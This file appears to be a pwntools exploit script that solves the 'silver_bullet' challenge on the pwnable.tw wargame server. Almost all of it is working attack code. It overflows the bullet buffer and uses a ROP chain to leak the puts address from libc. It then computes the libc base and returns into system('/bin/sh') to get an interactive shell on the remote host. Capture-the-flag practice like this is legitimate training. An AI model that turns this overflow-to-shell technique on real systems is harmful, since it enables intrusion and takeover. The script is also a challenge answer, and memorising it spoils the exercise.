import os
from pwn import *

pc = './silver_bullet'
pwn_elf = ELF(pc)
libc = ELF('./libc.so.6')

remote_ip = 'chall.pwnable.tw'
remote_port = 10103
p = remote(remote_ip,remote_port)
#p = process(pc,env ={'LD_PRELOAD':'./libc.so.6'})
#gdb.attach(p,'b* 0x08048A18')


context.log_level = True
context.arch = 'i386'


def sla(a,b):
	p.sendlineafter(a,b)

def lg(s,addr):
	print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def sl(a):
	p.sendline(a)

def rv(a):
	return p.recv(a)

def sn(a):
	p.send(a)
def sa(a,b):
	p.sendafter(a,b)

def ru(a):
	p.recvuntil(a)

def hack():
	raw_input()
	data = 0x0804b200
	leave_ret = 0x08048558
	ppp_ret = 0x08048a79
	pop_ret = 0x08048475
	vul_func = 0x08048954

	read_plt = pwn_elf.plt['read']
	puts_plt = pwn_elf.plt['puts']
	puts_got = pwn_elf.got['puts']

	#method 1:
	sla('choice :','1')
	sla('bullet :','a'*0x18)
	sla('choice :','2')
	sa('bullet :','a'*0x18)
	sla('choice :','2')
	fake_ebp = data - 4
	payload = '\xff'*3 + p32(fake_ebp) + p32(puts_plt) + p32(vul_func) + p32(puts_got)
	sla('bullet :',payload)
	
	sla('choice :','3')
	ru('!!\n')
	puts_addr = u32(rv(4))
	libc.address = puts_addr - libc.symbols['puts']
	lg('libc.address',libc.address)
	system_addr = libc.symbols['system']
	lg('system_addr',system_addr)
	sh_addr = next(libc.search('/bin/sh'))
	lg('sh_addr',sh_addr)


	sla('choice :','1')
	sla('bullet :','a'*0x18)
	sla('choice :','2')
	sa('bullet :','a'*0x18)
	sla('choice :','2')
	fake_ebp = data - 4
	payload = '\xff'*3 + p32(fake_ebp) + p32(system_addr) + p32(vul_func) + p32(sh_addr)
	sla('bullet :',payload)
	
	sla('choice :','3')
	p.interactive()

hack()